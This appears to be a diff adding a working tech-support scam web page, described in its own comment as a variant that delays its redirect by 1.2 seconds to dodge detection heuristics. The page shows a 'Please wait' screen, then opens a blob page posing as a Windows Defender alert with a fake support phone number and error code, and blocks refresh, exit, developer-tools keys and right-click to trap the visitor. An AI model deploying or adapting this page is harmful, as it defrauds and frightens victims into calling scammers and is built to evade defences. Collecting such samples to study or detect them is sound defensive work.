@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<!-- Variant: waits 1.2 s before redirecting into the blob (tries to dodge "immediate redirect" heuristics). -->
+<html lang="en"><head><meta charset="utf-8"><title>Please wait</title></head>
+<body><p>Checking your browser…</p>
+<script>
+  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Security Warning</title>
+  <style>body{margin:0;background:#0047ab;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
+  <body><div><h1>Your PC has been blocked</h1>
+  <p>Windows Defender detected a Trojan spyware infection. Do not shut down your PC.</p>
+  <p>Contact Windows Support toll-free:</p><h2>1 (844) 555-0123</h2><p>Error code: 0x80070424</p></div>
+  <script>
+    document.addEventListener('keydown', e => { if (['F5','F11','F12','Escape'].includes(e.key) || (e.ctrlKey && 'rwl'.includes(e.key.toLowerCase()))) e.preventDefault(); });
+    document.addEventListener('contextmenu', e => e.preventDefault());
+  <\/script></body></html>`;
+  setTimeout(() => { location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' })); }, 1200);
+</script></body></html>
